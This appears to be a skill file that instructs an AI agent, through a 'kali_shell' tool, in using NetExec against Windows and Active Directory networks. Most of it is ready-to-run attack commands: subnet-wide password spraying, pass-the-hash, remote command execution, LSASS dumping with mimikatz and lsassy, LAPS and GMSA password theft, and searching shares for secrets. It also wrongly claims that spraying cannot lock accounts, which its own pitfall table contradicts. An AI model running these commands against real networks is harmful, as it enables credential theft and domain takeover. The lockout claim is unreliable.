---
name: NetExec (nxc)
description: Network service exploitation toolkit (successor to CrackMapExec) for SMB, SSH, WinRM, LDAP, RDP, and more — password spraying, lateral movement, and enumeration
---

# NetExec (nxc)

Pull this skill for network-level credential validation, password spraying, local admin checking, and lateral movement across SMB, SSH, WinRM, LDAP, RDP, and other protocols. NetExec is the modern replacement for CrackMapExec.

## RedAmon wiring

| Action | Tool | Notes |
|--------|------|-------|
| SMB enumeration | `kali_shell` — `netexec smb` | Shares, users, OS, sessions |
| WinRM access | `kali_shell` — `netexec winrm` | Remote command execution |
| SSH brute/access | `kali_shell` — `netexec ssh` | SSH credential check |
| LDAP enumeration | `kali_shell` — `netexec ldap` | AD user/group enumeration |
| RDP check | `kali_shell` — `netexec rdp` | RDP access verification |
| Password spraying | `kali_shell` — `netexec` | Any protocol with `-u` + `-p` |
| Pass-the-hash | `kali_shell` — `netexec` | Use `-H` with NTLM hash |
| LAPS reader | `kali_shell` — `netexec ldap` | `--laps` flag |
| Spider search | `kali_shell` — `netexec smb` | Regex search across SMB shares |

## Primer

NetExec uses a modular protocol system — you specify the protocol as a subcommand:

```
netexec <protocol> <target(s)> [options]
```

### Available protocols

| Protocol | Discovery | Auth | Execution |
|----------|-----------|------|-----------|
| `smb` | Shares, OS, sessions, users | Password, hash, Kerberos | Command execution (if admin) |
| `winrm` | — | Password, hash, Kerberos | PowerShell command exec |
| `ssh` | OS version, auth methods | Password, key | Remote shell |
| `ldap` | Users, groups, computers, GMSA, LAPS | Password, hash, Kerberos | — |
| `rdp` | — | Password, hash | — (check only) |
| `vnc` | — | Password | — (check only) |
| `wmi` | — | Password, hash | Command execution (if admin) |
| `ftp` | — | Password | — (check only) |

## SMB enumeration

```bash
# Basic SMB scan of subnet
netexec smb 192.168.1.0/24

# With credentials
netexec smb 192.168.1.0/24 -u user -p Password123

# List shares (with creds)
netexec smb 192.168.1.100 -u user -p Password123 --shares

# List logged-in users (sessions)
netexec smb 192.168.1.100 -u user -p Password123 --sessions

# List local groups and members
netexec smb 192.168.1.100 -u user -p Password123 --local-groups

# Check which hosts you're admin on
netexec smb 192.168.1.0/24 -u user -p Password123
# -> look for (Pwn3d!) in output

# Pass-the-hash
netexec smb 192.168.1.0/24 -u administrator -H NTHASH

# Disable SMB signing check
netexec smb 192.168.1.0/24 -u user -p Password123 --signing
```

## WinRM execution

```bash
# Check WinRM access
netexec winrm 192.168.1.100 -u user -p Password123

# Execute command
netexec winrm 192.168.1.100 -u user -p Password123 -x whoami

# Execute PowerShell
netexec winrm 192.168.1.100 -u user -p Password123 -X "Get-Process"

# Pass-the-hash to WinRM
netexec winrm 192.168.1.100 -u administrator -H NTHASH -x whoami
```

## LDAP enumeration

```bash
# Basic LDAP scan
netexec ldap 192.168.1.100 -u user -p Password123

# Enumerate AD users
netexec ldap 192.168.1.100 -u user -p Password123 --users

# Enumerate groups
netexec ldap 192.168.1.100 -u user -p Password123 --groups

# Get all computers (for bloodhound target list)
netexec ldap 192.168.1.100 -u user -p Password123 --computers

# Get domain info
netexec ldap 192.168.1.100 -u user -p Password123 --domain-info

# Read LAPS passwords (requires LAPS permission)
netexec ldap 192.168.1.100 -u user -p Password123 --laps

# Get GMSA passwords
netexec ldap 192.168.1.100 -u user -p Password123 --gmsa

# Query specific LDAP attributes
netexec ldap 192.168.1.100 -u user -p Password123 \
  --query "(objectClass=user)" "samaccountname description"
```

## Password spraying

```bash
# Single user, single password
netexec smb target.com -u users.txt -p Password123

# Single user, multiple passwords
netexec smb target.com -u users.txt -p passwords.txt

# Spray across a whole subnet
netexec smb 192.168.1.0/24 -u users.txt -p Winter2024

# With hash spraying (pass-the-hash)
netexec smb 192.168.1.0/24 -u users.txt -H NTHASH

# Check for no password / same-as-username
netexec smb 192.168.1.0/24 -u users.txt -p ''  # No password
netexec smb 192.168.1.0/24 -u users.txt -p 'UsernameAsPassword'  # Not automatic, generate list
```

## SSH

```bash
# SSH credential check
netexec ssh 192.168.1.0/24 -u root -p passwords.txt

# Execute command on SSH
netexec ssh 192.168.1.100 -u root -p Password123 -x whoami

# SSH with key
netexec ssh 192.168.1.100 -u root -p '' --key-file ~/.ssh/id_rsa
```

## Spider (SMB content search)

```bash
# Search SMB shares for files matching pattern
netexec smb 192.168.1.100 -u user -p Password123 \
  --spider "Users\$" --pattern "password|secret|token" --depth 3

# Search for specific file types
netexec smb 192.168.1.100 -u user -p Password123 \
  --spider "Shares\$" --pattern "\.(xls|xlsx|doc|docx|pdf|csv)$" --depth 5

# Search without auth (if shares are open)
netexec smb 192.168.1.100 --spider "Public" --pattern "\.txt$"
```

## Modules

```bash
# List available modules
netexec smb -L

# Run a module
netexec smb 192.168.1.100 -u user -p Password123 -M rdp

# Module with options
netexec smb 192.168.1.100 -u user -p Password123 -M mimikatz -o "COMMAND='privilege::debug sekurlsa::logonpasswords'"

# Common modules
netexec smb 192.168.1.100 -u user -p Password123 -M lsassy     # Dump lsass remotely
netexec smb 192.168.1.100 -u user -p Password123 -M nanodump    # LSASS minidump
netexec smb 192.168.1.100 -u user -p Password123 -M slinky      # Create SMB link for hash capture
netexec smb 192.168.1.100 -u user -p Password123 -M keepass_discovery  # Find KeePass files
netexec smb 192.168.1.100 -u user -p Password123 -M bloodhound   # Run SharpHound remotely
```

## Recipes

### Full domain audit pipeline
```bash
# 1. SMB sweep with creds
netexec smb 192.168.1.0/24 -u user -p Password123 > smb_results.txt

# 2. Extract (Pwn3d!) hosts
grep "Pwn3d!" smb_results.txt

# 3. Enumerate all users from LDAP
netexec ldap 192.168.1.100 -u user -p Password123 --users > domain_users.txt

# 4. Password spray across domain
netexec smb 192.168.1.0/24 -u domain_users.txt -p Autumn2024!
```

### Check which users can access which protocols
```bash
# Multi-protocol sweep
for user in $(cat users.txt); do
  echo "=== Checking $user ==="
  netexec smb 192.168.1.0/24 -u "$user" -p Password123 | grep "(user\|Pwn3d)"
  netexec winrm 192.168.1.0/24 -u "$user" -p Password123 | grep "(user\|Pwn3d)"
  netexec rdp 192.168.1.0/24 -u "$user" -p Password123 | grep "(user\|Pwn3d)"
done
```

## Pitfalls and recovery

| Pitfall | Fix |
|---------|-----|
| SMB signing required means no pwn | You can still enumerate (users, shares, sessions) but can't execute commands |
| "STATUS_ACCOUNT_LOCKED_OUT" | Too many attempts. Wait for lockout window or use different user; lower rate |
| WinRM not available (5985/5986) | WinRM may be disabled or firewalled. Try SMB or WMI instead. |
| LDAP query returns nothing | Anonymous LDAP may be disabled. Use credentials; check with `-u` explicitly. |
| NTLM hash spraying blocked | Kerberos auth may be required. Use Kerberos with `-k` flag and `KRB5CCNAME`. |
| Module fails | Module may not exist for the target's OS version. Check with `-L`. |
| Network unreachable | Check routing or use `--timeout` for slow networks. |

## Hand-off

- After finding (Pwn3d!) hosts: `-> /skill/tooling/impacket` for psexec/wmiexec
- With extracted LAPS passwords: `-> /skill/tooling/netexec` smb with LAPS creds
- After enumerating users: `-> /skill/active_directory/ad_kill_chain`
- With local admin on a host: `-> /skill/tooling/bloodhound` for session collection
- For password spraying at scale: `-> /skill/tooling/hydra` for targeted service-specific attacks

## Pro tips

- **The `Pwn3d!` marker is your compass**: When netexec shows `(Pwn3d!)` next to a host, it means your user is a local administrator. You can execute commands there. This is the most important output.
- **Password spraying with netexec is safe**: netexec does one login attempt per user/password combo then moves on. It does NOT lock accounts (unlike hydra). Use it for initial access, hydra for targeted brute-force.
- **Use `--local-auth` for local users**: If you're targeting local admin accounts (not domain accounts), always add `--local-auth`. Otherwise netexec tries domain auth and fails.
- **LAPS is free DA**: If your user has `ReadLAPSPassword` rights (visible in BloodHound or netexec LDAP), you can read every machine's local admin password. This often leads directly to Domain Admin through privilege paths.
- **Combine grep with netexec output**: `grep -E "(Pwn3d!|SESSIONS)"` filters the most actionable results. The output can be noisy — always filter.
